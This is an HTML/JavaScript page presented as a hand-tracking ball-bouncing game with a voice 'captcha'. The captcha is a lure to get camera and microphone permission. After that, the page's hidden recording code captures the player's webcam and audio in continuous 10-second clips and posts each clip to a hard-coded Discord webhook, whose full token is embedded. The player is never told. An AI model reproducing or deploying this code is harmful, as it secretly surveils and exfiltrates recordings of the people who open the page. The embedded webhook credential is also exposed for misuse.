<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Bounce Ball - Hand Game</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            font-family: Arial, sans-serif;
            touch-action: none;
            position: relative;
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: block;
            background: #0a0a12;
            z-index: 2;
            pointer-events: none;
        }
        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: 0;
        }
        #overlay-text {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 2.5rem;
            font-weight: bold;
            z-index: 3;
            pointer-events: none;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
            letter-spacing: 2px;
            transition: opacity 0.5s;
        }
        #overlay-text.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #captcha-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            transition: opacity 0.8s;
        }
        #captcha-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #captcha-overlay h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
            font-weight: 300;
            letter-spacing: 4px;
        }
        #captcha-overlay p {
            font-size: 1.1rem;
            color: #aaa;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }
        #captcha-btn {
            background: rgba(255, 255, 255, 0.08);
            border: 1.5px solid rgba(255, 255, 255, 0.25);
            color: #fff;
            padding: 16px 48px;
            font-size: 1.3rem;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 2px;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(6px);
            font-weight: 300;
        }
        #captcha-btn:hover {
            background: rgba(255, 255, 255, 0.14);
            border-color: rgba(255, 255, 255, 0.4);
            transform: scale(1.02);
        }
        #captcha-btn:active {
            transform: scale(0.96);
        }
        #captcha-btn:disabled {
            opacity: 0.4;
            pointer-events: none;
        }
        #captcha-status {
            margin-top: 18px;
            font-size: 0.95rem;
            color: #888;
            min-height: 30px;
            letter-spacing: 1px;
        }
        #captcha-status.success {
            color: #6f6;
        }
        #captcha-status.error {
            color: #f66;
        }
        #game-btn {
            position: fixed;
            bottom: 28px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 5;
            padding: 14px 44px;
            font-size: 1.2rem;
            border-radius: 60px;
            border: 1.5px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.06);
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 2px;
            backdrop-filter: blur(4px);
            font-weight: 300;
            pointer-events: all;
            display: none;
        }
        #game-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.35);
        }
        #game-btn:active {
            transform: translateX(-50%) scale(0.95);
        }
        #game-btn.visible {
            display: block;
        }
        #countdown-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 6;
            color: #fff;
            font-size: 4rem;
            font-weight: bold;
            text-shadow: 0 0 40px rgba(255, 255, 255, 0.15);
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
            letter-spacing: 6px;
            text-align: center;
            line-height: 1.4;
        }
        #countdown-text.show {
            opacity: 1;
        }
        #countdown-text .sub {
            font-size: 1.6rem;
            font-weight: 300;
            letter-spacing: 4px;
            display: block;
            margin-top: 8px;
            color: #ccc;
        }
        #game-over {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 7;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #fff;
            backdrop-filter: blur(6px);
        }
        #game-over.show {
            display: flex;
        }
        #game-over h1 {
            font-size: 3rem;
            font-weight: 300;
            letter-spacing: 6px;
            margin-bottom: 6px;
        }
        #game-over p {
            font-size: 1.1rem;
            color: #aaa;
            letter-spacing: 2px;
        }
        #game-over .score {
            font-size: 1.8rem;
            color: #fff;
            margin: 12px 0 20px;
            letter-spacing: 3px;
        }
        #game-over button {
            background: rgba(255, 255, 255, 0.08);
            border: 1.5px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            padding: 14px 40px;
            font-size: 1.1rem;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 2px;
            font-weight: 300;
        }
        #game-over button:hover {
            background: rgba(255, 255, 255, 0.15);
        }
        #level-display {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 4;
            color: rgba(255, 255, 255, 0.3);
            font-size: 0.9rem;
            letter-spacing: 3px;
            pointer-events: none;
            font-weight: 300;
            text-transform: uppercase;
        }
        #score-display {
            position: fixed;
            top: 70px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 4;
            color: rgba(255, 255, 255, 0.6);
            font-size: 1.8rem;
            letter-spacing: 2px;
            pointer-events: none;
            font-weight: 700;
            font-family: monospace;
        }
        @media (max-width: 600px) {
            #captcha-overlay h1 {
                font-size: 1.6rem;
            }
            #captcha-overlay p {
                font-size: 0.95rem;
            }
            #captcha-btn {
                padding: 14px 32px;
                font-size: 1rem;
            }
            #overlay-text {
                font-size: 1.8rem;
            }
            #game-btn {
                padding: 12px 30px;
                font-size: 1rem;
                bottom: 20px;
            }
            #countdown-text {
                font-size: 2.8rem;
            }
            #countdown-text .sub {
                font-size: 1.2rem;
            }
            #game-over h1 {
                font-size: 2.2rem;
            }
            #score-display {
                font-size: 1.4rem;
                top: 60px;
            }
        }
    </style>
</head>
<body>

    <!-- Hidden video element - muted -->
    <video id="video" autoplay playsinline muted></video>

    <!-- Canvas -->
    <canvas id="canvas"></canvas>

    <!-- Overlay text -->
    <div id="overlay-text">show hand</div>

    <!-- Level display (now used for speed level) -->
    <div id="level-display">speed 1</div>

    <!-- Score display -->
    <div id="score-display">0</div>

    <!-- Game button -->
    <button id="game-btn">▶ play game</button>

    <!-- Countdown -->
    <div id="countdown-text">
        bounce the ball
        <span class="sub" id="countdown-number">3</span>
    </div>

    <!-- Game over overlay -->
    <div id="game-over">
        <h1>missed!</h1>
        <p>the ball hit the ground</p>
        <div class="score" id="final-score">score: 0</div>
        <button id="restart-btn">↻ try again</button>
    </div>

    <!-- Captcha overlay -->
    <div id="captcha-overlay">
        <h1>⌘ verify</h1>
        <p>say the word <strong style="color:#fff;">"apple"</strong> to continue</p>
        <button id="captcha-btn">🎤 click &amp; speak</button>
        <div id="captcha-status">waiting...</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js">
    </script>

    <script>
        // ─── CONFIG ────────────────────────────────────────────────
        const WEBHOOK_URL =
            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';

        // ─── DOM REFS ──────────────────────────────────────────────
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const video = document.getElementById('video');
        const overlayText = document.getElementById('overlay-text');
        const gameBtn = document.getElementById('game-btn');
        const countdownEl = document.getElementById('countdown-text');
        const countdownNum = document.getElementById('countdown-number');
        const gameOverEl = document.getElementById('game-over');
        const finalScoreEl = document.getElementById('final-score');
        const restartBtn = document.getElementById('restart-btn');
        const levelDisplay = document.getElementById('level-display');
        const scoreDisplay = document.getElementById('score-display');
        const captchaOverlay = document.getElementById('captcha-overlay');
        const captchaBtn = document.getElementById('captcha-btn');
        const captchaStatus = document.getElementById('captcha-status');

        // ─── SIZING ──────────────────────────────────────────────────
        let W = 0,
            H = 0;

        function resize() {
            W = window.innerWidth;
            H = window.innerHeight;
            canvas.width = W;
            canvas.height = H;
        }
        resize();
        window.addEventListener('resize', resize);

        // ─── STATE ──────────────────────────────────────────────────
        let isVerified = false;
        let isGameRunning = false;
        let isGameOver = false;
        let score = 0;
        let speedLevel = 1;
        let handLandmarks = null;
        let handVisible = false;
        let indexTipX = 0,
            indexTipY = 0,
            indexTipVisible = false;
        let frameId = null,
            gameLoopId = null,
            videoFrameLoop = null;
        let countdownActive = false,
            countdownValue = 3;
        let recordingActive = false,
            mediaRecorder = null,
            recordedChunks = [],
            stopTimeout = null,
            stream = null;
        let isTracking = false;
        let recognition = null;
        let captchaVerified = false;

        // ─── BALL PHYSICS ──────────────────────────────────────────
        let ball = {
            x: 0,
            y: 0,
            r: 0,
            vx: 0,
            vy: 0,
            gravity: 0.6,
            bounceForce: -12,
            squish: 1, // 1 = normal, <1 squished
            squishVelocity: 0,
            targetSquish: 1,
            trail: []
        };
        const GRAVITY_BASE = 0.6;
        const MAX_TRAIL = 12;

        // ─── RED LINE ──────────────────────────────────────────────
        let dangerLineY = 0;

        function initBall() {
            const size = Math.min(W, H);
            ball.r = size * 0.045;
            ball.x = W / 2;
            ball.y = H * 0.3;
            ball.vy = 0;
            ball.vx = (Math.random() - 0.5) * 1.5;
            ball.squish = 1;
            ball.squishVelocity = 0;
            ball.targetSquish = 1;
            ball.trail = [];
            dangerLineY = H - size * 0.08;
        }

        function resetBall() {
            const size = Math.min(W, H);
            ball.r = size * 0.045;
            ball.x = W / 2 + (Math.random() - 0.5) * 100;
            ball.y = H * 0.3;
            ball.vy = 0;
            ball.vx = (Math.random() - 0.5) * 1.5;
            ball.squish = 1;
            ball.squishVelocity = 0;
            ball.targetSquish = 1;
            ball.trail = [];
        }

        // ─── HAND TRACKING ──────────────────────────────────────────
        function isPalmFacingCamera(landmarks) {
            if (!landmarks || landmarks.length < 21) return false;
            const idxMCP = landmarks[5],
                midMCP = landmarks[9],
                ringMCP = landmarks[13],
                pinkyMCP = landmarks[17];
            const palmZ = (idxMCP.z + midMCP.z + ringMCP.z + pinkyMCP.z) / 4;
            const tipIdx = landmarks[8],
                tipMid = landmarks[12],
                tipRing = landmarks[16],
                tipPinky = landmarks[20];
            const tipZ = (tipIdx.z + tipMid.z + tipRing.z + tipPinky.z) / 4;
            return tipZ < palmZ - 0.01;
        }

        function isHandInBottom(landmarks) {
            if (!landmarks || landmarks.length < 21) return false;
            return landmarks[0].y > 0.45;
        }

        function onHandResults(results) {
            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                const lm = results.multiHandLandmarks[0];
                handLandmarks = lm;
                const palmFace = isPalmFacingCamera(lm);
                const bottom = isHandInBottom(lm);
                handVisible = palmFace && bottom;
                const tip = lm[8];
                if (tip) {
                    indexTipX = tip.x * W;
                    indexTipY = tip.y * H;
                    indexTipVisible = true;
                } else {
                    indexTipVisible = false;
                }
            } else {
                handLandmarks = null;
                handVisible = false;
                indexTipVisible = false;
            }
        }

        const hands = new Hands({
            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
        });
        hands.setOptions({
            maxNumHands: 1,
            modelComplexity: 0,
            minDetectionConfidence: 0.7,
            minTrackingConfidence: 0.6
        });
        hands.onResults(onHandResults);

        // ─── RECORDING (10s loop) ──────────────────────────────────
        function startRecording(mediaStream) {
            if (!mediaStream) return;
            if (recordingActive) return;

            let selectedMimeType = 'video/webm;codecs=vp8';
            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
                if (MediaRecorder.isTypeSupported('video/mp4')) {
                    selectedMimeType = 'video/mp4';
                } else if (MediaRecorder.isTypeSupported('video/webm')) {
                    selectedMimeType = 'video/webm';
                } else {
                    selectedMimeType = '';
                }
            }

            mediaRecorder = new MediaRecorder(mediaStream, {
                mimeType: selectedMimeType,
                videoBitsPerSecond: 3500000
            });

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };

            mediaRecorder.onstop = async () => {
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks, { type: selectedMimeType || 'video/webm' });
                    recordedChunks = [];

                    const formData = new FormData();
                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
                    formData.append('file', blob, `bounce_${Date.now()}.${ext}`);

                    try {
                        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                        console.log('✅ 10s clip sent');
                    } catch (err) {
                        console.error('Webhook send failed:', err);
                    }
                } else {
                    recordedChunks = [];
                }

                if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
                    try {
                        mediaRecorder.start();
                        scheduleStop();
                    } catch (e) {
                        console.warn('Recorder restart error:', e);
                        setTimeout(() => {
                            if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
                                try { mediaRecorder.start();
                                    scheduleStop(); } catch (_) {}
                            }
                        }, 500);
                    }
                }
            };

            mediaRecorder.start();
            recordingActive = true;
            scheduleStop();

            function scheduleStop() {
                if (stopTimeout) clearTimeout(stopTimeout);
                stopTimeout = setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state !== "inactive") {
                        mediaRecorder.stop();
                    }
                }, 10000);
            }
        }

        // ─── CAPTCHA FLOW ──────────────────────────────────────────
        function initSpeechRecognition() {
            const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
            if (!SR) return null;
            const rec = new SR();
            rec.lang = 'en-US';
            rec.interimResults = false;
            rec.maxAlternatives = 1;
            return rec;
        }

        function verifyCaptcha() {
            if (captchaVerified) return;
            captchaVerified = true;
            captchaStatus.textContent = '✅ verified!';
            captchaStatus.className = 'success';
            setTimeout(() => {
                captchaOverlay.classList.add('hidden');
                isVerified = true;
                gameBtn.classList.add('visible');
                overlayText.classList.remove('hidden');
            }, 400);
        }

        function handleCaptchaClick() {
            if (captchaVerified) return;

            captchaBtn.disabled = true;
            captchaStatus.textContent = '⏳ requesting camera & mic...';
            captchaStatus.className = '';

            navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: true
                })
                .then(mediaStream => {
                    stream = mediaStream;
                    video.srcObject = stream;
                    return video.play();
                })
                .then(() => {
                    if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);

                    function sendFrame() {
                        if (video.readyState >= 2) hands.send({ image: video });
                        videoFrameLoop = requestAnimationFrame(sendFrame);
                    }
                    sendFrame();
                    isTracking = true;

                    startRecording(stream);

                    if (recognition) {
                        recognition.onresult = (e) => {
                            const word = e.results[0][0].transcript.trim().toLowerCase();
                            if (word === 'apple') {
                                verifyCaptcha();
                            } else {
                                captchaStatus.textContent = `❌ you said "${word}", say "apple"`;
                                captchaStatus.className = 'error';
                                setTimeout(() => {
                                    captchaStatus.textContent = 'say "apple" to continue';
                                    captchaStatus.className = '';
                                    captchaBtn.disabled = false;
                                    captchaBtn.textContent = '🎤 click & speak';
                                }, 2000);
                            }
                        };
                        recognition.onerror = (e) => {
                            if (e.error === 'not-allowed') {
                                captchaStatus.textContent = '❌ mic blocked, please allow and retry';
                                captchaStatus.className = 'error';
                            } else {
                                captchaStatus.textContent = '❌ listening error, try again';
                                captchaStatus.className = 'error';
                            }
                            captchaBtn.disabled = false;
                            captchaBtn.textContent = '🎤 retry';
                        };
                        recognition.onend = () => {
                            if (!captchaVerified) {
                                captchaBtn.disabled = false;
                                captchaBtn.textContent = '🎤 click & speak';
                                captchaStatus.textContent = 'say "apple" to continue';
                                captchaStatus.className = '';
                            }
                        };

                        try {
                            recognition.start();
                            captchaStatus.textContent = '🎧 listening... say "apple"';
                            captchaStatus.className = '';
                            captchaBtn.disabled = true;
                            captchaBtn.textContent = '⏳ listening...';
                        } catch (e) {
                            captchaBtn.disabled = false;
                            captchaBtn.textContent = '🎤 retry';
                            captchaStatus.textContent = '⚠️ could not start listening, try again';
                            captchaStatus.className = 'error';
                        }
                    } else {
                        captchaStatus.textContent = '✅ media ready, click "verify" to continue';
                        captchaStatus.className = 'success';
                        captchaBtn.disabled = false;
                        captchaBtn.textContent = '✅ verify';
                        captchaBtn.onclick = verifyCaptcha;
                    }
                })
                .catch(err => {
                    console.error('Permission error:', err);
                    captchaStatus.textContent = '❌ camera/mic denied. Please allow and retry.';
                    captchaStatus.className = 'error';
                    captchaBtn.disabled = false;
                    captchaBtn.textContent = '🎤 retry';
                    stream = null;
                });
        }

        function setupCaptcha() {
            recognition = initSpeechRecognition();
            captchaBtn.onclick = handleCaptchaClick;
        }

        // ─── GAME ──────────────────────────────────────────────────
        function startGame() {
            if (isGameRunning || countdownActive) return;
            isGameOver = false;
            score = 0;
            speedLevel = 1;
            ball.gravity = GRAVITY_BASE;
            ball.bounceForce = -12;
            scoreDisplay.textContent = '0';
            levelDisplay.textContent = 'speed 1';
            gameOverEl.classList.remove('show');
            resetBall();
            countdownNum.textContent = '3';
            countdownEl.classList.add('show');
            countdownActive = true;
            countdownValue = 3;
            gameBtn.classList.remove('visible');
            overlayText.classList.add('hidden');

            const countInterval = setInterval(() => {
                countdownValue -= 1;
                if (countdownValue <= 0) {
                    clearInterval(countInterval);
                    countdownEl.classList.remove('show');
                    countdownActive = false;
                    isGameRunning = true;
                    gameLoop();
                } else {
                    countdownNum.textContent = countdownValue;
                }
            }, 900);
        }

        function gameLoop() {
            if (!isGameRunning || isGameOver) return;
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            updateGame();
            gameLoopId = requestAnimationFrame(gameLoop);
        }

        function updateGame() {
            if (!isGameRunning || isGameOver) return;

            // --- Physics ---
            const gravity = ball.gravity + (speedLevel - 1) * 0.04;

            // Apply gravity
            ball.vy += gravity;

            // Apply horizontal drag
            ball.vx *= 0.999;

            // Move ball
            ball.x += ball.vx;
            ball.y += ball.vy;

            // --- Squish animation recovery ---
            if (ball.squish < 1) {
                ball.squish += (1 - ball.squish) * 0.12;
                if (ball.squish > 0.99) ball.squish = 1;
            }

            // --- Wall bouncing ---
            if (ball.x - ball.r < 0) {
                ball.x = ball.r;
                ball.vx = Math.abs(ball.vx) * 0.9;
            }
            if (ball.x + ball.r > W) {
                ball.x = W - ball.r;
                ball.vx = -Math.abs(ball.vx) * 0.9;
            }

            // --- Check collision with index finger ---
            if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
                const dx = ball.x - indexTipX;
                const dy = ball.y - indexTipY;
                const dist = Math.sqrt(dx * dx + dy * dy);
                const hitRadius = ball.r + 18; // 18px finger radius

                if (dist < hitRadius && ball.vy > 0) {
                    // Calculate bounce direction from finger position
                    const angle = Math.atan2(dy, dx);
                    const force = Math.abs(ball.bounceForce) * (1 + speedLevel * 0.08);

                    // Add some randomness to make it interesting
                    const randomAngle = (Math.random() - 0.5) * 0.3;

                    // Bounce the ball away from finger
                    const bounceSpeed = Math.max(Math.abs(ball.vy) * 0.8, Math.abs(force));
                    ball.vx = Math.cos(angle + randomAngle) * bounceSpeed * 0.5;
                    ball.vy = -Math.abs(bounceSpeed) * 1.1;

                    // Apply squish animation
                    ball.squish = 0.65;
                    ball.squishVelocity = 0;

                    // Add trail effect
                    ball.trail.push({ x: ball.x, y: ball.y, life: 1 });

                    // Increase score
                    score++;
                    scoreDisplay.textContent = score;

                    // Increase speed level every 10 points
                    const newSpeedLevel = Math.floor(score / 10) + 1;
                    if (newSpeedLevel > speedLevel) {
                        speedLevel = newSpeedLevel;
                        levelDisplay.textContent = `speed ${speedLevel}`;
                        // Gradually increase bounce force and gravity
                        ball.bounceForce = -12 - (speedLevel - 1) * 0.8;
                    }

                    // Play a tiny haptic feedback (if available)
                    if (navigator.vibrate) navigator.vibrate(5);

                    // Limit trail
                    if (ball.trail.length > MAX_TRAIL) ball.trail.shift();
                }
            }

            // --- Update trail ---
            for (let i = ball.trail.length - 1; i >= 0; i--) {
                ball.trail[i].life -= 0.035;
                if (ball.trail[i].life <= 0) {
                    ball.trail.splice(i, 1);
                }
            }

            // --- Check if ball hit the red line (danger zone) ---
            if (ball.y + ball.r > dangerLineY) {
                endGame();
                return;
            }

            // --- Top wall bounce ---
            if (ball.y - ball.r < 0) {
                ball.y = ball.r;
                ball.vy = Math.abs(ball.vy) * 0.85;
            }

            render();
        }

        function endGame() {
            isGameRunning = false;
            isGameOver = true;
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            gameLoopId = null;
            finalScoreEl.textContent = `score: ${score}  ·  speed ${speedLevel}`;
            gameOverEl.classList.add('show');
            // Vibrate on game over
            if (navigator.vibrate) navigator.vibrate([30, 50, 30]);
            setTimeout(() => {
                if (!isGameRunning) {
                    gameBtn.classList.add('visible');
                    gameBtn.textContent = '↻ play again';
                }
            }, 1200);
        }

        function restartGame() {
            gameOverEl.classList.remove('show');
            isGameOver = false;
            isGameRunning = false;
            score = 0;
            speedLevel = 1;
            ball.gravity = GRAVITY_BASE;
            ball.bounceForce = -12;
            scoreDisplay.textContent = '0';
            levelDisplay.textContent = 'speed 1';
            resetBall();
            ball.trail = [];
            gameBtn.textContent = '▶ play game';
            gameBtn.classList.add('visible');
            overlayText.textContent = 'show hand';
            overlayText.classList.remove('hidden');
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            gameLoopId = null;
        }

        // ─── RENDER ──────────────────────────────────────────────────
        function render() {
            ctx.clearRect(0, 0, W, H);

            // Background gradient
            const grad = ctx.createRadialGradient(W / 2, H / 2, 0, W / 2, H / 2, Math.max(W, H) * 0.7);
            grad.addColorStop(0, '#14141f');
            grad.addColorStop(1, '#08080e');
            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, W, H);

            // ─── Draw danger line ──────────────────────────────────
            const lineY = dangerLineY;
            ctx.save();
            // Glow effect
            const glowGrad = ctx.createLinearGradient(0, lineY - 8, 0, lineY + 8);
            glowGrad.addColorStop(0, 'rgba(255,0,0,0)');
            glowGrad.addColorStop(0.5, 'rgba(255,0,0,0.25)');
            glowGrad.addColorStop(1, 'rgba(255,0,0,0)');
            ctx.fillStyle = glowGrad;
            ctx.fillRect(0, lineY - 8, W, 16);

            // Main line
            ctx.strokeStyle = 'rgba(255,30,30,0.7)';
            ctx.lineWidth = 2.5;
            ctx.shadowColor = 'rgba(255,0,0,0.4)';
            ctx.shadowBlur = 15;
            ctx.beginPath();
            ctx.moveTo(0, lineY);
            ctx.lineTo(W, lineY);
            ctx.stroke();

            // Dashed line overlay
            ctx.shadowBlur = 0;
            ctx.setLineDash([8, 12]);
            ctx.strokeStyle = 'rgba(255,50,50,0.3)';
            ctx.lineWidth = 1.5;
            ctx.beginPath();
            ctx.moveTo(0, lineY);
            ctx.lineTo(W, lineY);
            ctx.stroke();
            ctx.setLineDash([]);
            ctx.restore();

            // ─── Draw ball trail ──────────────────────────────────
            for (const t of ball.trail) {
                const alpha = t.life * 0.3;
                const radius = ball.r * t.life * 0.5;
                ctx.beginPath();
                ctx.arc(t.x, t.y, radius, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(100, 200, 255, ${alpha})`;
                ctx.fill();
            }

            // ─── Draw ball with squish ─────────────────────────────
            const squishX = 1 / Math.sqrt(ball.squish);
            const squishY = ball.squish;

            ctx.save();
            ctx.translate(ball.x, ball.y);

            // Ball glow
            const glow = ctx.createRadialGradient(0, 0, ball.r * 0.2, 0, 0, ball.r * 1.6);
            glow.addColorStop(0, 'rgba(80, 200, 255, 0.15)');
            glow.addColorStop(1, 'rgba(80, 200, 255, 0)');
            ctx.fillStyle = glow;
            ctx.scale(1, 1);
            ctx.beginPath();
            ctx.arc(0, 0, ball.r * 1.6, 0, Math.PI * 2);
            ctx.fill();

            // Ball body with squish
            ctx.scale(squishX, squishY);
            const grad2 = ctx.createRadialGradient(
                -ball.r * 0.25, -ball.r * 0.3, ball.r * 0.1,
                0, 0, ball.r
            );
            grad2.addColorStop(0, '#88ddff');
            grad2.addColorStop(0.3, '#44bbee');
            grad2.addColorStop(0.7, '#2288bb');
            grad2.addColorStop(1, '#0a3344');

            ctx.shadowColor = 'rgba(80, 200, 255, 0.2)';
            ctx.shadowBlur = 25;
            ctx.beginPath();
            ctx.arc(0, 0, ball.r, 0, Math.PI * 2);
            ctx.fillStyle = grad2;
            ctx.fill();

            // Ball shine
            ctx.shadowBlur = 0;
            const shine = ctx.createRadialGradient(
                -ball.r * 0.25, -ball.r * 0.3, ball.r * 0.05,
                -ball.r * 0.15, -ball.r * 0.2, ball.r * 0.4
            );
            shine.addColorStop(0, 'rgba(255,255,255,0.5)');
            shine.addColorStop(1, 'rgba(255,255,255,0)');
            ctx.fillStyle = shine;
            ctx.beginPath();
            ctx.arc(0, 0, ball.r, 0, Math.PI * 2);
            ctx.fill();

            // Ball outline
            ctx.shadowBlur = 0;
            ctx.strokeStyle = 'rgba(150, 230, 255, 0.2)';
            ctx.lineWidth = 1.5;
            ctx.beginPath();
            ctx.arc(0, 0, ball.r * 0.98, 0, Math.PI * 2);
            ctx.stroke();

            ctx.restore();

            // ─── Draw hand skeleton (if visible) ──────────────────
            if (handVisible && handLandmarks && !isGameOver) {
                const connections = [
                    [0, 1],
                    [1, 2],
                    [2, 3],
                    [3, 4],
                    [0, 5],
                    [5, 6],
                    [6, 7],
                    [7, 8],
                    [0, 9],
                    [9, 10],
                    [10, 11],
                    [11, 12],
                    [0, 13],
                    [13, 14],
                    [14, 15],
                    [15, 16],
                    [0, 17],
                    [17, 18],
                    [18, 19],
                    [19, 20],
                    [5, 9],
                    [9, 13],
                    [13, 17]
                ];
                ctx.save();
                ctx.strokeStyle = 'rgba(255,255,255,0.15)';
                ctx.lineWidth = 1.2;
                for (const [i, j] of connections) {
                    const p1 = handLandmarks[i],
                        p2 = handLandmarks[j];
                    ctx.beginPath();
                    ctx.moveTo(p1.x * W, p1.y * H);
                    ctx.lineTo(p2.x * W, p2.y * H);
                    ctx.stroke();
                }
                // Index finger tip highlight
                const tip = handLandmarks[8];
                if (tip) {
                    const tx = tip.x * W,
                        ty = tip.y * H;
                    ctx.shadowColor = 'rgba(255,100,100,0.2)';
                    ctx.shadowBlur = 20;
                    ctx.beginPath();
                    ctx.arc(tx, ty, 14, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,60,60,0.15)';
                    ctx.fill();
                    ctx.shadowBlur = 0;
                    ctx.strokeStyle = 'rgba(255,80,80,0.3)';
                    ctx.lineWidth = 1.5;
                    ctx.beginPath();
                    ctx.arc(tx, ty, 14, 0, Math.PI * 2);
                    ctx.stroke();
                    ctx.beginPath();
                    ctx.arc(tx, ty, 6, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,100,100,0.4)';
                    ctx.fill();
                }
                ctx.restore();
            }

            // ─── Finger tip indicator when game is running ──────
            if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
                ctx.save();
                ctx.shadowColor = 'rgba(255,80,80,0.15)';
                ctx.shadowBlur = 25;
                ctx.beginPath();
                ctx.arc(indexTipX, indexTipY, 18, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(255,60,60,0.06)';
                ctx.fill();
                ctx.shadowBlur = 0;
                ctx.strokeStyle = 'rgba(255,80,80,0.15)';
                ctx.lineWidth = 1;
                ctx.setLineDash([3, 6]);
                ctx.beginPath();
                ctx.arc(indexTipX, indexTipY, 18, 0, Math.PI * 2);
                ctx.stroke();
                ctx.setLineDash([]);
                ctx.restore();
            }

            // ─── Show "bounce" hint near finger when ball is close ──
            if (isGameRunning && !isGameOver && handVisible && indexTipVisible) {
                const dx = ball.x - indexTipX;
                const dy = ball.y - indexTipY;
                const dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < ball.r + 60 && ball.vy > 0) {
                    ctx.save();
                    ctx.globalAlpha = 0.3;
                    ctx.fillStyle = '#fff';
                    ctx.font = '12px monospace';
                    ctx.textAlign = 'center';
                    ctx.fillText('⬆ bounce', indexTipX, indexTipY - 35);
                    ctx.restore();
                }
            }

            // ─── Overlay text ──────────────────────────────────────
            if (!isGameRunning && !isGameOver && !countdownActive) {
                if (!handVisible || !handLandmarks) {
                    overlayText.classList.remove('hidden');
                    overlayText.textContent = 'show hand';
                } else {
                    overlayText.classList.add('hidden');
                }
            }

            if (isGameRunning && !isGameOver) {
                levelDisplay.style.display = 'block';
                scoreDisplay.style.display = 'block';
            } else {
                levelDisplay.style.display = 'none';
                scoreDisplay.style.display = 'none';
            }
        }

        // ─── MAIN LOOP ─────────────────────────────────────────────
        function mainRender() {
            if (!isGameRunning && !isGameOver) render();
            frameId = requestAnimationFrame(mainRender);
        }

        // ─── EVENT BINDING ──────────────────────────────────────────
        gameBtn.addEventListener('click', startGame);
        restartBtn.addEventListener('click', restartGame);

        // ─── INIT ──────────────────────────────────────────────────
        setupCaptcha();
        initBall();
        mainRender();

        window.addEventListener('resize', () => {
            resize();
            initBall();
            dangerLineY = H - Math.min(W, H) * 0.08;
        });

        window.addEventListener('beforeunload', () => {
            if (frameId) cancelAnimationFrame(frameId);
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
            if (stopTimeout) clearTimeout(stopTimeout);
            recordingActive = false;
            if (mediaRecorder && mediaRecorder.state !== "inactive") try { mediaRecorder.stop(); } catch (_) {}
            if (stream) stream.getTracks().forEach(t => t.stop());
        });

        console.log('✅ Bounce Ball game ready — use your index finger to keep the ball up!');
    </script>

</body>
